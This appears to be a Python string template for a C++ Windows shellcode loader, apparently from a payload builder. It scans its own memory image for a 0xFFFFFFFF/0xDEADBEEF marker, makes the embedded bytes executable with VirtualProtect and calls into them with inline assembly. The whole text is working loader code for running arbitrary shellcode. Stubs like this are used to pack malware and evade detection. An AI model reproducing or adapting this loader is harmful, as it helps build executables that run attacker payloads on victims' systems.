code = '''
#include <iostream>
#include <windows.h>
#include <process.h>
#include <cstdint>

int main()
{{
    SIZE_T shellCodeSize = {0};

    //Get location of exe in memory
    HANDLE mHandle = GetModuleHandle(0);
    DWORD baseAddress = (DWORD)mHandle;
    LPDWORD baseAddressPtr = (LPDWORD)mHandle;

    //Search for shellcode marker
    LPDWORD shellCodePtr = nullptr;
    BOOL found = false;
    int i = 0;
    while (!found)
    {{
        DWORD temp = *(baseAddressPtr + i);
        if (temp == 0xFFFFFFFF)
        {{
            i++;
            temp = *(baseAddressPtr + i);
            if (temp == 0xDEADBEEF)
            {{
                shellCodePtr = baseAddressPtr + i;
                shellCodePtr++;
                found = true;
            }}
        }}
        i++;
    }}
    //make the shellcode executable and execute
    DWORD oldProtect = 0;
    BOOL vProWorked = VirtualProtect(shellCodePtr, shellCodeSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    if (vProWorked)
    {{
        __asm {{
            mov eax, shellCodePtr
            call eax
        }}
    }}
    else
    {{
        std::cout << "Virtual Protect Failed\\n";
    }}
}}
'''